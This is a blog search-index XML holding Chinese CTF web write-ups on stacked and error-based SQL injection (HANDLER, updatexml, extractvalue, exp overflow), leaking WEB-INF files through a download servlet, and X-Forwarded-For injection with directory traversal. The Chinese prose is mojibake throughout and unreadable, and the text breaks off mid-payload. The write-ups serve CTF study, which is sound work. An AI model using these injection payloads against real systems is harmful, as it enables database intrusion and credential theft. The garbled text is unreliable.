<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WebWriteUp6</title>
    <link href="/2024/02/15/WebWriteUp6/"/>
    <url>/2024/02/15/WebWriteUp6/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240215204748047.png" alt="image-20240215204748047"></p><p>åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215205117946.png" alt="image-20240215205117946"></p><p>è€è§„çŸ©æŸ¥è¯¢å­—æ®µæ•°ï¼š</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215210150043.png" alt="image-20240215210150043"></p><p>ä¸å‡ºæ„å¤–ï¼Œå­˜åœ¨ä¸€ä¸ªé»‘åå•</p><p>è¿™é•¿å¾—è·Ÿä¹‹å‰ä¸€é“å †å æ³¨å…¥çš„é¢˜ä¸€æ ·ï¼Œè§<a href="https://tehs411.github.io/2024/01/24/WebWriteUp/#%E9%9A%8F%E4%BE%BF%E6%B3%A8">WebWriteUp</a></p><p>å°è¯•å †å æ³¨å…¥ï¼š</p><p>1â€™; show databases;#</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211301582.png" alt="image-20240215211301582"></p><p>1â€™; show tables;</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211337899.png" alt="image-20240215211337899"></p><p>æŸ¥åˆ—ï¼š1â€™; show columns from FlagHere;</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211552322.png" alt="image-20240215211552322"></p><p>ç”±äºsetè¢«è¿‡æ»¤æ‰äº†ï¼Œä¿®æ”¹è¡¨åçš„æ–¹æ³•ä¸å¥½ä½¿ï¼Œé‚£ä¹ˆä½¿ç”¨handleræ–¹æ³•ï¼š</p><p>æ„é€ payloadï¼š1â€™; handler FlagHere open; handler FlagHere read first;</p><p>å³å¯æ‹¿åˆ°flag</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240215212312862.png" alt="image-20240215212312862"></p><p>éšä¾¿è¾“å…¥è¯•è¯•ï¼Œç”¨æˆ·å1ï¼Œå¯†ç 2</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215212338501.png" alt="image-20240215212338501"></p><p>ç‚¹å‡»helpçœ‹çœ‹</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215212414036.png" alt="image-20240215212414036"></p><p>æç¤ºè¯´æ‰¾ä¸åˆ°è¿™ä¸ªhelp.docx</p><p>ç›´æ¥urlè®¿é—®è¯•è¯•</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213150168.png" alt="image-20240215213150168"></p><p>èƒ½ä¸‹è½½ï¼Œä½†æ‰“å¼€åå•¥ä¹Ÿæ²¡æœ‰</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213218161.png" alt="image-20240215213218161"></p><p>é‚£ä¹ˆæ—¢ç„¶èƒ½é€šè¿‡urlè®¿é—®ç›®å½•ç›´æ¥ä¸‹è½½ï¼Œé‚£ä¹ˆå¾—å°è¯•æ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/WEB-INF/</span>web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™<br><span class="hljs-regexp">/WEB-INF/</span>classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <span class="hljs-keyword">class</span> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet <span class="hljs-keyword">class</span> å’Œéservlet <span class="hljs-keyword">class</span>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br><span class="hljs-regexp">/WEB-INF/</span>lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br><span class="hljs-regexp">/WEB-INF/</span>src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶<br><span class="hljs-regexp">/WEB-INF/</span>database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å°è¯•è®¿é—®&#x2F;WEB-INF&#x2F;web.xml</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213426726.png" alt="image-20240215213426726"></p><p>404äº†</p><p>åœ¨ç‚¹å‡»helpçš„ç•Œé¢å°è¯•ï¼ˆå› ä¸ºæ­¤å¤„urlè‡ªåŠ¨åŠ äº†ä¸ªDownloadï¼‰</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213706064.png" alt="image-20240215213706064"></p><p>ä¾ç„¶æ²¡ç”¨ï¼Œå°è¯•ç”¨postæ–¹å¼è¯•è¯•ï¼š</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213802810.png" alt="image-20240215213802810"></p><p>æˆåŠŸä¸‹è½½ï¼ŒæŸ¥çœ‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>Index<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Flag<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>Servlet æ˜¯ Java ç¼–ç¨‹è¯­è¨€çš„ä¸€ç§ç”¨äºæ‰©å±•æœåŠ¡å™¨åŠŸèƒ½çš„æŠ€æœ¯ã€‚Servlet æ˜¯åœ¨æœåŠ¡å™¨ç«¯è¿è¡Œçš„å°å‹ç¨‹åºï¼Œå®ƒæä¾›äº†ä¸€ç§å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶ç”ŸæˆåŠ¨æ€ç½‘é¡µçš„æ–¹æ³•ã€‚</p></blockquote><p>è¿™æ®µä»£ç å‘Šè¯‰æˆ‘ä»¬ï¼Œç¼–è¯‘ä¹‹åå°±ä¼šç”Ÿæˆä¸€ä¸ªFlagController.classè¿™ä¸ªç±»</p><p>ä¸‹è½½ä¸‹æ¥ï¼š</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215214206502.png" alt="image-20240215214206502"></p><p><img src="/2024/02/15/WebWriteUp6/image-20240215214426539.png" alt="image-20240215214426539"></p><p>æ‰“å¼€æ˜¯ä¸€å †ä¹±ç ï¼Œä½†æœ‰ä¸€ä¸²å­—ç¬¦åæœ‰&#x3D;&#x3D;ï¼Œbase64è§£å¯†åå¾—åˆ°flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240216204606234.png" alt="image-20240216204606234"></p><p>ç‚¹å‡»flagï¼šå‘ç°å±å¹•ä¼šæ˜¾ç¤ºå‡ºå½“å‰æœºå™¨çš„ip</p><p>ç‚¹å‡»hintï¼šhintçš„æºç ä¸­å­˜åœ¨è¿™æ ·çš„æ³¨é‡Š</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216204937344.png" alt="image-20240216204937344"></p><p>æŠ“åŒ…çœ‹çœ‹ï¼Œå¹¶æ²¡æœ‰å‘ç°æœ‰ä»€ä¹ˆæ˜¾ç¤ºäº†ipçš„åœ°æ–¹</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216210713160.png" alt="image-20240216210713160"></p><p>æ„Ÿè§‰è·å–çš„é€”å¾„å¯èƒ½æ˜¯ä»Headerä¸­è·å–çš„ï¼Œå°è¯•ä¿®æ”¹XFFè¯•è¯•ï¼ˆ<a href="https://tehs411.github.io/2024/01/29/WebWriteUp2/#HTTP">XFFç›¸å…³</a>ï¼‰</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216211555399.png" alt="image-20240216211555399"></p><p>å‘ç°å¯ä»¥ä¿®æ”¹ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨XFFæ³¨å…¥</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212349425.png" alt="image-20240216212349425"></p><p>çœ‹åˆ°å½“å‰ç›®å½•å­˜åœ¨flag.phpï¼Œä½†è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬ç°åœ¨è®¿é—®çš„é¡µé¢ï¼ŒæŒ‰ç€ä¹‹å‰çš„é¢˜ç›®ï¼Œé€šå¸¸flagåœ¨æ ¹ç›®å½•ï¼Œå°è¯•ç›®å½•ç©¿è¶Šï¼š(å…¶å®è¿™é‡Œä¸€å±‚å°±è¡Œäº†)</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212533280.png" alt="image-20240216212533280"></p><p>è·å–flagï¼š</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212625882.png" alt="image-20240216212625882"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp5</title>
    <link href="/2024/02/12/WebWriteUp5/"/>
    <url>/2024/02/12/WebWriteUp5/</url>
    
    <content type="html"><![CDATA[<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240212131853474.png" alt="image-20240212131853474"></p><p>è¿˜æ˜¯è¿™ä¸ªç†Ÿæ‚‰çš„ç•Œé¢</p><p><strong>åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹</strong></p><p>ç”¨æˆ·å1ï¼Œå¯†ç 2â€™ or 1&#x3D;1#ï¼Œå›æ˜¾å¦‚ä¸‹ï¼Œæš‚æ—¶æ— æ³•åˆ¤æ–­</p><p><img src="/2024/02/12/WebWriteUp5/image-20240212131943122.png" alt="image-20240212131943122"></p><p>ç›´æ¥ä½¿ç”¨unionï¼Œselectè¯•è¯•ï¼Œéƒ½æ˜¯è¿™ä¸ªç•Œé¢ï¼Œæ‰€ä»¥è¯´ï¼Œè¿™äº›å…³é”®è¯åº”è¯¥å…¨éƒ¨è¢«è¿‡æ»¤æ‰äº†</p><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥æ˜¯é€šè¿‡ç‰¹æ®Šå‡½æ•°é”™è¯¯ä½¿ç”¨å¹¶ä½¿å…¶è¾“å‡ºé”™è¯¯ç»“æœæ¥è·å–ä¿¡æ¯çš„ã€‚ç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯åœ¨å¯ä»¥è¿›è¡Œsqlæ³¨å…¥çš„ä½ç½®ï¼Œè°ƒç”¨ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼Œåˆ©ç”¨å‡½æ•°æŠ¥é”™ä½¿å…¶è¾“å‡ºé”™è¯¯ç»“æœæ¥è·å–æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯</p><p><strong>BigIntæ•°æ®ç±»å‹æº¢å‡º</strong></p><p>è·å–è¡¨åpayloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+</span><br></code></pre></td></tr></table></figure><p>è·å–åˆ—åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)a)) --+<br></code></pre></td></tr></table></figure><p>è·å–å¯¹åº”ä¿¡æ¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and exp(~(select * from(select username from &#x27;users&#x27; limit 0,1))) --+<br></code></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>exp(int)å‡½æ•°è¿”å›eçš„xæ¬¡æ–¹ï¼Œå½“xçš„å€¼è¶³å¤Ÿå¤§çš„æ—¶å€™å°±ä¼šå¯¼è‡´å‡½æ•°çš„ç»“æœæ•°æ®ç±»å‹æº¢å‡ºï¼Œä¹Ÿå°±ä¼šå› æ­¤æŠ¥é”™ï¼šâ€DOUBLE value is out of rangeâ€</p><p>?id&#x3D;1â€ and exp(~(select * from (select user())a)) â€“+</p><p>å…ˆæŸ¥è¯¢select user()è¿™ä¸ªè¯­å¥çš„ç»“æœï¼Œç„¶åå°†æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ªç»“æœé›†å–åä¸ºa</p><p>ç„¶ååœ¨æŸ¥è¯¢select * from a æŸ¥è¯¢aï¼Œå°†ç»“æœé›†aå…¨éƒ¨æŸ¥è¯¢å‡ºæ¥</p><p>æŸ¥è¯¢å®Œæˆï¼Œè¯­å¥æˆåŠŸæ‰§è¡Œï¼Œè¿”å›å€¼ä¸º0ï¼Œå†å–å(~æŒ‰ä½å–åè¿ç®—ç¬¦)ï¼Œexpè°ƒç”¨çš„æ—¶å€™eçš„é‚£ä¸ªæ•°çš„æ¬¡æ–¹ï¼Œå°±ä¼šé€ æˆæŠ¥é”™ï¼Œå†é€šè¿‡â€“+æ³¨é‡Šæ‰å¯èƒ½å­˜åœ¨çš„å…¶ä»–è¯­å¥</p><p>åœ¨æœ¬é¢˜ä¸­ï¼Œå°è¯•è¿‡ç¨‹ä¸­å‘ç°ä¾ç„¶æ— æ³•å®ç°æ­¤æ–¹æ³•ï¼Œå¯èƒ½æ˜¯expè¢«è¿‡æ»¤æ‰äº†</p><p><strong>å‡½æ•°å‚æ•°æ ¼å¼é”™è¯¯</strong></p><p>åº”ç”¨çš„å‡½æ•°ï¼š<strong>updatexml()    extractvalue()</strong></p><p>æˆ‘ä»¬å°±éœ€è¦æ„é€ Xpath_stringæ ¼å¼é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å°†Xpath_stringçš„å€¼ä¼ é€’æˆä¸ç¬¦åˆæ ¼å¼çš„å‚æ•°ï¼Œmysqlå°±ä¼šæŠ¥é”™</p><blockquote><p>XPathï¼ˆXML Path Languageï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ XML æ–‡æ¡£ä¸­å®šä½å’Œé€‰æ‹©å…ƒç´ çš„æŸ¥è¯¢è¯­è¨€ã€‚é€šå¸¸ï¼ŒXPath è¡¨è¾¾å¼æ˜¯ç”±ä¸€ç³»åˆ—è·¯å¾„å’Œæ¡ä»¶ç»„æˆï¼Œç”¨äºåœ¨ XML æ–‡æ¡£ä¸­å¯¼èˆªå’Œé€‰æ‹©èŠ‚ç‚¹ã€‚XPath è¡¨è¾¾å¼å¯ä»¥åŒ…å«å¤šä¸ªéƒ¨åˆ†ï¼Œä¾‹å¦‚èŠ‚ç‚¹åç§°ã€è·¯å¾„è¿ç®—ç¬¦ã€è°“è¯å’Œå‡½æ•°ã€‚</p></blockquote><p><strong>updatexml()å‡½æ•°è¯­æ³•ï¼šupdatexml(XML_document,Xpath_string,new_value)</strong></p><p>XML_document:æ˜¯å­—ç¬¦ä¸²Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡åç§°</p><p>Xpath_string:Xpathæ ¼å¼çš„å­—ç¬¦ä¸²</p><p>new_value:stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><p><strong>å½“ç¬¬äºŒä¸ªå‚æ•°çš„æ ¼å¼å’ŒXpathçš„æ ¼å¼ä¸ç¬¦çš„æ—¶å€™ï¼Œå°±ä¼šäº§ç”ŸæŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„payloadæ„é€ åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œè®©å…¶éšç€æŠ¥é”™ä¿¡æ¯å±•ç¤ºåˆ°é¡µé¢ä¸Šã€‚è€Œ~ç¬¦å·(asciiç¼–ç å€¼ï¼š0x7e)æ˜¯ä¸å­˜åœ¨xpathæ ¼å¼ä¸­çš„</strong></p><p>æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„ç”¨æˆ·ä¿¡æ¯ä»¥åŠæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>è·å–å½“å‰æ•°æ®åº“ä¸‹æ•°æ®è¡¨ä¿¡æ¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>è·å–usersè¡¨åçš„åˆ—åä¿¡æ¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>è·å–usersæ•°æ®è¡¨ä¸‹usernameã€passwordä¸¤åˆ—åçš„ç”¨æˆ·å­—æ®µä¿¡æ¯:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+<br><br>?id=1&quot; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">3</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><strong>extractvalue()å‡½æ•°è¯­æ³•:extractvalue(XML_document,XPath_string)</strong></p><p>åŒä¸Šç†</p><p>è·å–å½“å‰æ˜¯æ•°æ®åº“åç§°åŠä½¿ç”¨mysqlæ•°æ®åº“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+<br></code></pre></td></tr></table></figure><p>è·å–å½“å‰ä½ç½®æ‰€ç”¨æ•°æ®åº“çš„ä½ç½®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+<br></code></pre></td></tr></table></figure><p>è·å–è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>è·å–usersè¡¨çš„åˆ—åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>è·å–å¯¹åº”çš„åˆ—åçš„ä¿¡æ¯(username&#x2F;password):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>å°è¯•ä¹‹åï¼Œå‘ç°æœ¬é¢˜å°±èƒ½åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p>æ„é€ payloadï¼šæŸ¥æ‰¾æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database()),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135244580.png" alt="image-20240212135244580"></p><p>æŸ¥æ‰¾è¡¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="hljs-string">&#x27;))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135344562.png" alt="image-20240212135344562"></p><p>æŸ¥åˆ—ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span 